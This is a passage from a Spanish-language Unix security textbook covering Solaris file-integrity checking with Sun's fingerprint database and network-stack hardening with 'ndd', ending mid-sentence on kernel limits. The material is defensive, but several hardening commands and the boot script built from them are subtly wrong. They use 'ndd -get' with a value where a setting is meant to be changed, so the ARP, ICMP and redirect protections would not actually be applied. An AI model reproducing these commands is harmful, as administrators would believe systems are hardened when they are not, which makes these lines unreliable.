consigue automatizar muchas tareas que de otra forma el administrador deber&#x02CA;&#x0131;a realizar manualmente. Su
potencia, unida a su sencillez de uso (y &#x2018;desuso&#x2019;), la convierten en algo si no imprescindible s&#x02CA;&#x0131; muy
importante en nuestros sistemas; incomprensiblemente no se utiliza de forma extendida, aunque es
previsible que con sus nuevas versiones (actualmente est&#x00E1; disponible la 0.3) esto comience a cambiar pronto.
Podemos obtener informaci&#x00F3;n adicional de esta herramienta en los BluePrints publicados por Sun
Microsystems y que se distribuyen, aparte de v&#x02CA;&#x0131;a web, en el directorio Documentation/ de la misma: <citation>[?]</citation>,
<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;
  </para></section><!--end subsection--><!--l. 1086--><section 
role="subsection"><title><abbrev role="title-mark">9.6.3</abbrev><anchor 
   id="x1-1410009.6.3"  ></anchor>sfpDB</title>
<!--l. 1087--><para>  La base de datos sfpDB (Solaris Fingerprint Database) es un servicio gratuito de Sun Microsystems que
permite a los usuarios veri&#xFB01;car la integridad de los archivos distribuidos con Solaris, tanto con la base del
operativo como con productos concretos de Sun o parches; esto permite por una parte veri&#xFB01;car que lo que
acabamos de instalar en una m&#x00E1;quina es realmente una distribuci&#x00F3;n de Solaris o&#xFB01;cial de Sun, y
por otra detectar si un pirata ha logrado modi&#xFB01;car alguno de los &#xFB01;cheros del sistema (como
/bin/login), t&#x02CA;&#x0131;picamente para situar troyanos o puertas traseras en una m&#x00E1;quina atacada: se trata
de un sistema de detecci&#x00F3;n de intrusos basado en host, como veremos a la hora de hablar de
IDSes.
<!--br/-->
<!--br/-->Para lograr su objetivo, desde http://sunsolve.sun.com/ se puede comparar la funci&#x00F3;n resumen MD5 de
determinados archivos que tenemos en nuestra m&#x00E1;quina con el resumen almacenado por Sun
Microsystems. Para ello en primer lugar hemos de generar el resumen de los &#xFB01;cheros que deseemos

veri&#xFB01;car, mediante la orden md5 (instalada como parte del paquete SUNWkeymg o de forma
independiente):

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;pkgchk&#x00A0;-l&#x00A0;-p&#x00A0;/usr/sbin/md5
&#x00A0;Pathname:&#x00A0;/usr/sbin/md5
&#x00A0;Type:&#x00A0;regular&#x00A0;file
&#x00A0;Expected&#x00A0;mode:&#x00A0;0755
&#x00A0;Expected&#x00A0;owner:&#x00A0;root
&#x00A0;Expected&#x00A0;group:&#x00A0;sys
&#x00A0;Expected&#x00A0;file&#x00A0;size&#x00A0;(bytes):&#x00A0;24384
&#x00A0;Expected&#x00A0;sum(1)&#x00A0;of&#x00A0;contents:&#x00A0;12899
&#x00A0;Expected&#x00A0;last&#x00A0;modification:&#x00A0;Nov&#x00A0;11&#x00A0;20:19:48&#x00A0;1999
&#x00A0;Referenced&#x00A0;by&#x00A0;the&#x00A0;following&#x00A0;packages:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;SUNWkeymg
&#x00A0;Current&#x00A0;status:&#x00A0;installed
&#x00A0;
&#x00A0;anita:/#&#x00A0;md5&#x00A0;/bin/su
&#x00A0;MD5&#x00A0;(/bin/su)&#x00A0;=&#x00A0;79982b7b2c7576113fa5dfe316fdbeae
&#x00A0;anita:/#
</literallayout>
<!--l. 1123--><para>Una vez hecho esto, introduciremos este resumen en un formulario web, y se nos proporcionar&#x00E1; informaci&#x00F3;n
sobre el mismo; si no hay problemas, el resultado ser&#x00E1; similar al siguiente:

     </para><literallayout role="verbatim">
&#x00A0;Results&#x00A0;of&#x00A0;Last&#x00A0;Search
&#x00A0;
&#x00A0;79982b7b2c7576113fa5dfe316fdbeae&#x00A0;-&#x00A0;(/bin/su)&#x00A0;-&#x00A0;1&#x00A0;match(es)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;canonical-path:&#x00A0;/usr/bin/su
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;package:&#x00A0;SUNWcsu
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;version:&#x00A0;11.8.0,REV=2000.01.08.18.17
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;architecture:&#x00A0;i386
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;source:&#x00A0;Solaris&#x00A0;8/Intel
</literallayout>
<!--l. 1138--><para>Mientras que si el resumen que hemos obtenido no se corresponde con el de ning&#x00FA;n &#xFB01;chero de las diferentes
versiones de Solaris u otro software de Sun, se nos dar&#x00E1; el error Not found in this database. Este error
de entrada implica que en nuestra m&#x00E1;quina tenemos algo cuanto menos &#x2018;extra~no&#x2019;, ya que es
extremadamente raro que un archivo del sistema como /bin/su, /bin/ps o /bin/ls sea modi&#xFB01;cado
en un sistema. Si fuera este el caso, y como administradores desconocemos a qu&#x00E9; puede ser
debida esa modi&#xFB01;caci&#x00F3;n, con una alta probabilidad nos han instalado un rootkit, un conjunto de
herramientas utilizadas por los piratas principalmente para ocultar su presencia y garantizarse el
acceso en una m&#x00E1;quina donde han conseguido privilegios de root; un rootkit instala versiones
troyanizadas de casi todos los programas que pueden ayudar en la detecci&#x00F3;n del pirata, como &#x2018;ls&#x2019; o
&#x2018;netstat&#x2019;, lo que provoca que si no ponemos un m&#x02CA;&#x0131;nimo de inter&#x00E9;s sea muy dif&#x02CA;&#x0131;cil detectar la
intrusi&#x00F3;n.
<!--br/-->
<!--br/-->Existen adem&#x00E1;s ciertas extensiones a la sfpDB cuyo objetivo es facilitar el uso de la base de datos <citation>[?]</citation>; una de
ellas es sfpC (Solaris Fingerprint Database Companion), que automatiza el proceso de generar y veri&#xFB01;car
los res&#x00FA;menes MD5 de un n&#x00FA;mero considerable de archivos mediante un script en PERL (recordemos que un
simple interfaz web que invoca a un CGI no es apropiado para todas las aplicaciones, por lo
que Sun Microsystems est&#x00E1; estudiando la posibilidad de publicar de otra forma el contenido
completo de la base de datos). Para conseguirlo, sfpC acepta como entrada un &#xFB01;chero que
contiene una lista de res&#x00FA;menes, dividi&#x00E9;ndola en diferentes partes para enviarlas por separado a la
sfpDB, y generando resultados globales en funci&#x00F3;n de cada uno de los resultados individuales
obtenidos.
<!--br/-->
<!--br/-->Otra de estas herramientas es sfpS (Solaris Fingerprint Database Sidekick), un sencillo shellscript que
funciona en conjunci&#x00F3;n con la propia sfpDB y con sfpC y cuyo objetivo es simpli&#xFB01;car la detecci&#x00F3;n de troyanos;
para ello, almacena una lista de ejecutables com&#x00FA;nmente troyanizados por cualquier rootkit, y es el
contenido de dicha lista el que se compara contra la base de datos mediante el script en PERL de
sfpC.
<!--br/-->
<!--br/-->Evidentemente esta base de datos de Sun Microsystems y sus utilidades asociadas (que podemos descargar
libremente desde las p&#x00E1;ginas web de esta compa~n&#x02CA;&#x0131;a), como cualquier otro producto a la hora de hablar de
seguridad, no es la panacea, sino s&#x00F3;lo una herramienta m&#x00E1;s que nos puede ayudar a detectar intrusiones en
una m&#x00E1;quina. Tambi&#x00E9;n tiene puntos d&#x00E9;biles, ya que por ejemplo un atacante que sea capaz de modi&#xFB01;car
ciertas utilidades del sistema podr&#x00E1; hacer lo mismo con el ejecutable &#x2018;md5&#x2019;, de forma que simule generar
resultados similares a los originales cuando veri&#xFB01;camos la integridad de utilidades troyanizadas; contra
esto, una soluci&#x00F3;n efectiva puede ser utilizar un &#x2018;md5&#x2019; est&#x00E1;tico y guardado en una unidad de s&#x00F3;lo lectura, y
por supuesto generado a partir de fuentes con&#xFB01;ables. Sin ser una herramienta excluyente, mediantes
consultas automatizadas a la base de datos proporcionada por Sun Microsystems tenemos la
posibilidad de descubrir intrusiones graves en nuestros sistemas en un tiempo m&#x02CA;&#x0131;nimo, y de forma
sencilla.
  </para></section><!--end subsection--></section><!--end section--><!--l. 1187--><section 
role="section"><title><abbrev role="title-mark">9.7</abbrev><anchor 
   id="x1-1420009.7"  ></anchor>El subsistema de red</title>

<!--l. 1188--><para>  Antes de hablar de la seguridad del subsistema de red en Solaris quiz&#x00E1;s sea necesario introducir el
comando &#x2018;ndd&#x2019;; esta orden permite tanto consultar (mediante el s&#x02CA;&#x0131;mbolo &#x2018;?&#x2019;) como modi&#xFB01;car la
con&#xFB01;guraci&#x00F3;n de ciertos drivers del sistema, en concreto los que soportan la pila de protocolos
TCP/IP:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;strong&#x005F;iss
&#x00A0;1
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;strong&#x005F;iss&#x00A0;2
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;strong&#x005F;iss
&#x00A0;2
&#x00A0;anita:/#
</literallayout>
<!--l. 1203--><para>Si quisi&#x00E9;ramos comprobar qu&#x00E9; par&#x00E1;metros ofrece un determinado driver (por ejemplo /dev/tcp), lo har&#x02CA;&#x0131;amos
con la orden siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/tcp&#x00A0;&#x005C;?
</literallayout>
<!--l. 1210--><para>El uso del car&#x00E1;cter &#x2018;<informalequation><graphic 
fileref="unixsec89x.gif"></graphic></informalequation>&#x2019; no es m&#x00E1;s que un escape del shell para el s&#x02CA;&#x0131;mbolo &#x2018;?&#x2019;. es importante conocer qu&#x00E9;
par&#x00E1;metros ofrece cada driver de nuestro sistema antes de plani&#xFB01;car una modi&#xFB01;caci&#x00F3;n de sus
valores, especialmente en Solaris 8, versi&#x00F3;n en la que ha cambiado ligeramente el nombre de
alguno de ellos y adem&#x00E1;s se han incluido algunos nuevos relativos a IPv6 (que no mostramos
aqu&#x02CA;&#x0131;).
<!--br/-->
<!--br/-->Los primeros par&#x00E1;metros que nos interesar&#x00E1; modi&#xFB01;car para incrementar la seguridad de nuestro sistema
pueden ser los relacionados con el forwarding, el reenv&#x02CA;&#x0131;o de paquetes de cierto tipo que llegan a la m&#x00E1;quina.
En primer lugar, es importante evitar que nuestro equipo se convierta en un enrutador; aunque en algunas
versiones de Solaris es su&#xFB01;ciente con crear el &#xFB01;chero /etc/notrouter, lo m&#x00E1;s recomendable es deshabilitar
por completo el IP Forwarding a nivel del subsistema de red, lo cual se consigue mediante la siguiente
orden:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forwarding&#x00A0;0
&#x00A0;anita:/#
</literallayout>
<!--l. 1230--><para>Tambi&#x00E9;n es importante evitar que en hosts con m&#x00FA;ltiples tarjetas se reenv&#x02CA;&#x0131;en tramas entre ellas;
con esto conseguimos hacer m&#x00E1;s dif&#x02CA;&#x0131;cil un ataque de IP Spoo&#xFB01;ng, ya que el sistema conoce
en todo momento a trav&#x00E9;s de que interfaz le llega un paquete, y si lo hace por una que no le
corresponde, la trama se ignora. Para lograr este objetivo podemos modi&#xFB01;car el valor del par&#x00E1;metro
ip<informalequation><graphic 
fileref="unixsec90x.gif"></graphic></informalequation>strict<informalequation><graphic 
fileref="unixsec91x.gif"></graphic></informalequation>dst<informalequation><graphic 
fileref="unixsec92x.gif"></graphic></informalequation>multihoming:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;strict&#x005F;dst&#x005F;multihoming&#x00A0;1
&#x00A0;anita:/#
</literallayout>
<!--l. 1242--><para>Los &#x00FA;ltimos par&#x00E1;metros relacionados con el reenv&#x02CA;&#x0131;o de tramas en la m&#x00E1;quina afectan a los broadcasts y a los
paquetes source routed (aquellos que contienen en su interior el camino a seguir, total o parcialmente,
hasta su destino). Por supuesto, no es recomendable el forwarding de broadcasts dirigidos desde
una estaci&#x00F3;n fuera de una red hacia todos los equipos de esa red, algo que una m&#x00E1;quina Solaris
con el IP Forwarding activado hace por defecto; de la misma forma, no se deben reenviar
tramas que marquen el camino a su destino, ya que en la mayor parte de redes no existen
motivos v&#x00E1;lidos para la emisi&#x00F3;n de este tipo de paquetes, y muchos de ellos son denotativos
de actividades sospechosas. Podemos evitar ambos reenv&#x02CA;&#x0131;os mediante las siguientes &#x00F3;rdenes
respectivamente:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forward&#x005F;directed&#x005F;broadcasts&#x00A0;0
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forward&#x005F;src&#x005F;routed&#x00A0;0
&#x00A0;anita:/#
</literallayout>
<!--l. 1260--><para>Otros par&#x00E1;metros a tener en cuenta para incrementar nuestro nivel de seguridad son algunos relativos a
ataques contra el protocolo ARP; para prevenir el ARP Spoo&#xFB01;ng es recomendable reducir el timeout que
Solaris presenta por defecto y que marca la frecuencia de borrado de las entradas de la tabla ARP y de la
tabla de rutado, &#xFB01;jando ambas en un minuto. Esto lo conseguimos mediante las &#x00F3;rdenes siguientes (en las
que especi&#xFB01;camos el tiempo en milisegundos):

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/arp&#x00A0;arp&#x005F;cleanup&#x005F;interval&#x00A0;60000
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;ire&#x005F;flush&#x005F;interval&#x00A0;60000
&#x00A0;anita:/#
</literallayout>
<!--l. 1274--><para>Dentro del protocolo ICMP tambi&#x00E9;n existen par&#x00E1;metros del subsistema de red interesantes para nuestra
seguridad; un grupo de ellos son los relacionados con los diferentes tipos de tramas ICMP que pueden
implicar un broadcast: ICMP<informalequation><graphic 
fileref="unixsec93x.gif"></graphic></informalequation>ECHO<informalequation><graphic 
fileref="unixsec94x.gif"></graphic></informalequation>REQUEST, ICMP<informalequation><graphic 
fileref="unixsec95x.gif"></graphic></informalequation>TIMESTAMP e ICMP<informalequation><graphic 
fileref="unixsec96x.gif"></graphic></informalequation>ADDRESS<informalequation><graphic 
fileref="unixsec97x.gif"></graphic></informalequation>MASK. Todos ellos
pueden ser utilizados para causar negaciones de servicio, por lo que una buena idea en la mayor parte de
situaciones es simplemente ignorarlos; incluso en el segundo caso (ICMP<informalequation><graphic 
fileref="unixsec98x.gif"></graphic></informalequation>TIMESTAMP) Solaris
ofrece la posibilidad de ignorar las tramas de este tipo aunque no sean broadcasts, simplemente
paquetes dirigidos a un host deterinado, ya que pueden proporcionar informaci&#x00F3;n del sistema
&#x00FA;til de cara a un ataque. Para conseguir ignorar todas estas tramas podemos ejecutar estas
&#x00F3;rdenes:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;echo&#x005F;broadcast&#x00A0;0
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;timestamp&#x005F;broadcast&#x00A0;0
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;address&#x005F;mask&#x005F;broadcast&#x00A0;0
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;timestamp&#x00A0;0
&#x00A0;anita:/#
</literallayout>
<!--l. 1295--><para>Todav&#x02CA;&#x0131;a dentro del protocolo ICMP, otro tipo de mensajes que nos pueden causar problemas son los
ICMP<informalequation><graphic 
fileref="unixsec99x.gif"></graphic></informalequation>REDIRECT; es conveniente deshabilitar tanto su emisi&#x00F3;n (s&#x00F3;lo un router tiene la necesidad de enviar
este tipo de tramas) como su recepci&#x00F3;n, ya que pueden ser utilizados para generar rutas falsas en el
subsistema de red de una m&#x00E1;quina. Para lograr ambas cosas podemos ejecutar las siguientes
&#x00F3;rdenes:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;ignore&#x005F;redirects&#x00A0;1
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;send&#x005F;redirects&#x00A0;0
&#x00A0;anita:/#
</literallayout>
<!--l. 1308--><para>La generaci&#x00F3;n de los n&#x00FA;meros iniciales de secuencia TCP es otro par&#x00E1;metro que seguramente nos interesar&#x00E1;
modi&#xFB01;car en un sistema Solaris; por defecto esta generaci&#x00F3;n se basa en incrementos pseudoaleatorios, lo que
puede facilitar ataques de IP Spoo&#xFB01;ng contra el sistema. Podemos aumentar nuestro nivel de seguridad
utilizando un esquema de generaci&#x00F3;n m&#x00E1;s robusto, basado en <citation>[?]</citation>, simplemente modi&#xFB01;cando el
&#xFB01;chero /etc/default/inetinit para asignarle al par&#x00E1;metro TCP<informalequation><graphic 
fileref="unixsec100x.gif"></graphic></informalequation>STRONG<informalequation><graphic 
fileref="unixsec101x.gif"></graphic></informalequation>ISS un valor de
2:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cat&#x00A0;/etc/default/inetinit
&#x00A0;#&#x00A0;@(#)inetinit.dfl&#x00A0;1.2&#x00A0;97/05/08
&#x00A0;#
&#x00A0;#&#x00A0;TCP&#x005F;STRONG&#x005F;ISS&#x00A0;sets&#x00A0;the&#x00A0;TCP&#x00A0;initial&#x00A0;sequence&#x00A0;number&#x00A0;generation&#x00A0;parameters.
&#x00A0;#&#x00A0;Set&#x00A0;TCP&#x005F;STRONG&#x005F;ISS&#x00A0;to&#x00A0;be:
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;=&#x00A0;Old-fashioned&#x00A0;sequential&#x00A0;initial&#x00A0;sequence&#x00A0;number&#x00A0;generation.
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1&#x00A0;=&#x00A0;Improved&#x00A0;sequential&#x00A0;generation,&#x00A0;with&#x00A0;random&#x00A0;variance&#x00A0;in&#x00A0;increment.
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2&#x00A0;=&#x00A0;RFC&#x00A0;1948&#x00A0;sequence&#x00A0;number&#x00A0;generation,&#x00A0;unique-per-connection-ID.
&#x00A0;#
&#x00A0;TCP&#x005F;STRONG&#x005F;ISS=2
&#x00A0;anita:/#
</literallayout>
<!--l. 1331--><para>Al contrario de lo que sucede con ndd, cuyos cambios se pierden al reiniciar el sistema y hay que plani&#xFB01;car
en el arranque si necesitamos hacerlos permanentes, la modi&#xFB01;caci&#x00F3;n del &#xFB01;chero anterior no tendr&#x00E1; efecto
hasta que el sistema vuelva a arrancar; si no queremos detener la m&#x00E1;quina, podemos conseguir lo mismo
mediante la orden &#x2018;ndd&#x2019; sobre el n&#x00FA;cleo en ejecuci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;strong&#x005F;iss&#x00A0;2
&#x00A0;anita:/#
</literallayout>
<!--l. 1343--><para>Tambi&#x00E9;n mediante ndd podemos modi&#xFB01;car en Solaris las restricciones relativas a los puertos reservados
(aquellos que s&#x00F3;lo el root puede utilizar, por defecto los que est&#x00E1;n por debajo del 1024). En primer lugar,
podemos de&#xFB01;nir el m&#x02CA;&#x0131;nimo puerto no reservado, para que las conexiones al sistema o los procesos de
usuario puedan utilizar s&#x00F3;lo los que est&#x00E1;n por encima de &#x00E9;l; si por ejemplo queremos que el rango de puertos
reservados comprenda a todos los que est&#x00E1;n por debajo del 5000 podemos ejecutar la orden
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;smallest&#x005F;nonpriv&#x005F;port&#x00A0;5000
&#x00A0;anita:/#
</literallayout>
<!--l. 1357--><para>Adem&#x00E1;s, desde su versi&#x00F3;n 2.6 Solaris permite marcar puertos individuales como reservados, tanto UDP como
TCP, y tambi&#x00E9;n eliminar esta restricci&#x00F3;n de puertos que previamente hayamos reservado; por defecto, aparte
de los primeros 1024 puertos, Solaris de&#xFB01;ne como reservados &#x2013; en TCP y UDP &#x2013; los puertos 2049 (nfsd) y
4045 (lockd). En el siguiente ejemplo se muestra c&#x00F3;mo consultar los puertos marcados de esta forma, c&#x00F3;mo
a~nadir un alguno a la lista, y c&#x00F3;mo eliminarlo de la misma; aunque el ejemplo se aplica a TCP, el caso
de UDP es completamente an&#x00E1;logo pero sustituyendo el nombre del dispositivo contra el que
ejecutamos la orden (que ser&#x02CA;&#x0131;a /dev/udp) y la cadena &#x2018;tcp&#x2019; del nombre de cada par&#x00E1;metro por
&#x2018;udp&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;extra&#x005F;priv&#x005F;ports
&#x00A0;2049
&#x00A0;4045
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;extra&#x005F;priv&#x005F;ports&#x005F;add&#x00A0;5000
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;extra&#x005F;priv&#x005F;ports
&#x00A0;2049
&#x00A0;4045
&#x00A0;5000
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;extra&#x005F;priv&#x005F;ports&#x005F;del&#x00A0;5000
&#x00A0;anita:/#&#x00A0;ndd&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;extra&#x005F;priv&#x005F;ports
&#x00A0;2049
&#x00A0;4045
&#x00A0;anita:/#
</literallayout>
<!--l. 1385--><para>Antes de &#xFB01;nalizar este punto es importante insistir en que los cambios producidos por &#x2018;ndd&#x2019; s&#x00F3;lo se
mantienen hasta el siguiente reinicio del sistema; de esta forma, las modi&#xFB01;caciones que hemos
visto aqu&#x02CA;&#x0131; se mantendr&#x00E1;n s&#x00F3;lo mientras la m&#x00E1;quina no se pare, pero si esto sucede en el arranque
todos los par&#x00E1;metros del subsistema de red tomar&#x00E1;n sus valores por defecto. Por tanto, lo m&#x00E1;s
probable es que nos interese plani&#xFB01;car en el inicio del sistema las modi&#xFB01;caciones estudiadas en
este punto para que se ejecuten de forma autom&#x00E1;tica; para conseguirlo, no tenemos m&#x00E1;s que
crear el script correspondiente y ubicarlo en el directorio /etc/rc2.d/ con un nombre que
comience por &#x2018;S&#x2019;, con lo que hacemos que se ejecute siempre que la m&#x00E1;quina entre en un runlevel
2:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/etc/init.d/nddconf
&#x00A0;#!/sbin/sh
&#x00A0;#
&#x00A0;#&#x00A0;Configuracion&#x00A0;segura&#x00A0;del&#x00A0;subsistema&#x00A0;de&#x00A0;red&#x00A0;de&#x00A0;Solaris
&#x00A0;#
&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forwarding&#x00A0;0
&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;strict&#x005F;dst&#x005F;multihoming&#x00A0;1
&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forward&#x005F;directed&#x005F;broadcasts&#x00A0;0
&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/ip&#x00A0;ip&#x005F;forward&#x005F;src&#x005F;routed&#x00A0;0
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/arp&#x00A0;arp&#x005F;cleanup&#x005F;interval&#x00A0;60000
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;ire&#x005F;flush&#x005F;interval&#x00A0;60000
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;echo&#x005F;broadcast&#x00A0;0
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;timestamp&#x005F;broadcast&#x00A0;0
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;address&#x005F;mask&#x005F;broadcast&#x00A0;0
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;respond&#x005F;to&#x005F;timestamp&#x00A0;0
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;ignore&#x005F;redirects&#x00A0;1
&#x00A0;ndd&#x00A0;-get&#x00A0;/dev/ip&#x00A0;ip&#x005F;send&#x005F;redirects&#x00A0;0
&#x00A0;ndd&#x00A0;-set&#x00A0;/dev/tcp&#x00A0;tcp&#x005F;strong&#x005F;iss&#x00A0;2
&#x00A0;#
&#x00A0;anita:~#&#x00A0;chmod&#x00A0;744&#x00A0;/etc/init.d/nddconf
&#x00A0;anita:~#&#x00A0;chown&#x00A0;root:sys&#x00A0;/etc/init.d/nddconf
&#x00A0;anita:~#&#x00A0;ln&#x00A0;/etc/init.d/nddconf&#x00A0;/etc/rc2.d/S70nddconf
&#x00A0;anita:~#
</literallayout>
<!--l. 1424--><para>Si queremos conocer mejor la con&#xFB01;guraci&#x00F3;n de seguridad del subsistema de red de Solaris una excelente obra
que no deber&#x02CA;&#x0131;a faltar en la mesa de ning&#x00FA;n administrador de sistemas es <citation>[?]</citation>; todo este punto est&#x00E1; basado
ampliamente en ella. Incluye, adem&#x00E1;s de explicaciones claras sobre el porqu&#x00E9; del valor de cada par&#x00E1;metro para
prevenir posibles ataques, un shellscript para plani&#xFB01;car en el inicio del sistema, much&#x02CA;&#x0131;simo m&#x00E1;s completo
que el presentado aqu&#x02CA;&#x0131;, y aplicable a varias versiones de Solaris (incluyendo la 8); en sistemas en
los que la seguridad es un factor a tener en cuenta (&#x00BF;todos?) es casi obligatorio utilizar esta
plani&#xFB01;caci&#x00F3;n.
  </para></section><!--end section--><!--l. 1442--><section 
role="section"><title><abbrev role="title-mark">9.8</abbrev><anchor 
   id="x1-1430009.8"  ></anchor>Par&#x00E1;metros del n&#x00FA;cleo</title>
<!--l. 1443--><para>  En el archivo /etc/system el administrador de un equipo Solaris puede de&#xFB01;nir variables para el
n&#x00FA;cleo del sistema operativo, como el n&#x00FA;mero m&#x00E1;ximo de &#xFB01;cheros abiertos por un proceso o el uso
de memoria compartida, sem&#x00E1;foros y mensajes para intercomunicaci&#x00F3;n entre procesos. En este
apartado vamos a comentar algunos de estos par&#x00E1;metros que pueden afectar a la seguridad;
hablaremos especialmente de aquellos que pueden y deben ser limitados para evitar diversos tipos
de negaciones de servicio, ataques que recordemos afectan a la disponibilidad de nuestros
recursos.
<!--br/-->
<!--br/-->Si deseamos ver el valor de alguno de los par&#x00E1;metros en el kernel que se est&#x00E1; ejecutando en este
momento, lo podemos hacer con la orden adb (n&#x00F3;tese que no ofrece ning&#x00FA;n prompt, hemos de escribir
directamente el par&#x00E1;metro a visualizar, con un &#x2018;/D&#x2019; al &#xFB01;nal para que nos muestre el valor en
decimal):

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;adb&#x00A0;-k&#x00A0;/dev/ksyms&#x00A0;/dev/mem
&#x00A0;physmem&#x00A0;38da
&#x00A0;maxusers/D
&#x00A0;maxusers:
&#x00A0;maxusers:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;56
&#x00A0;maxuprc/D
&#x00A0;maxuprc:
&#x00A0;maxuprc:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;901
&#x00A0;&#x02C6;d
&#x00A0;anita:~#
</literallayout>
<!--l. 1473--><para>Una negaci&#x00F3;n de servicio muy t&#x02CA;&#x0131;pica en Unix es el consumo excesivo de recursos por parte de usuarios que
lanzan &#x2013; voluntaria o involuntariamente &#x2013; demasiados procesos; esto es especialmente com&#x00FA;n en sistemas
de I+D, donde muchos usuarios se dedican a programar, y un peque~no error en el c&#x00F3;digo (a
veces denominado &#x2018;runaway fork&#x2019;) puede hacer que el sistema se vea parado por un exceso
de procesos activos en la tabla. La gravedad del problema aumenta si pensamos que tambi&#x00E9;n
es muy habitual que los usuarios lancen simulaciones que tardan en ejecutarse varios d&#x02CA;&#x0131;as
(o varias semanas), de forma que una parada inesperada puede causar la p&#x00E9;rdida de muchas
horas de trabajo. Por tanto, parece obvio que es recomendable limitar el n&#x00FA;mero de procesos
simult&#x00E1;neos por usuario; en Solaris este n&#x00FA;mero est&#x00E1; ilimitado por defecto, por lo que si deseamos
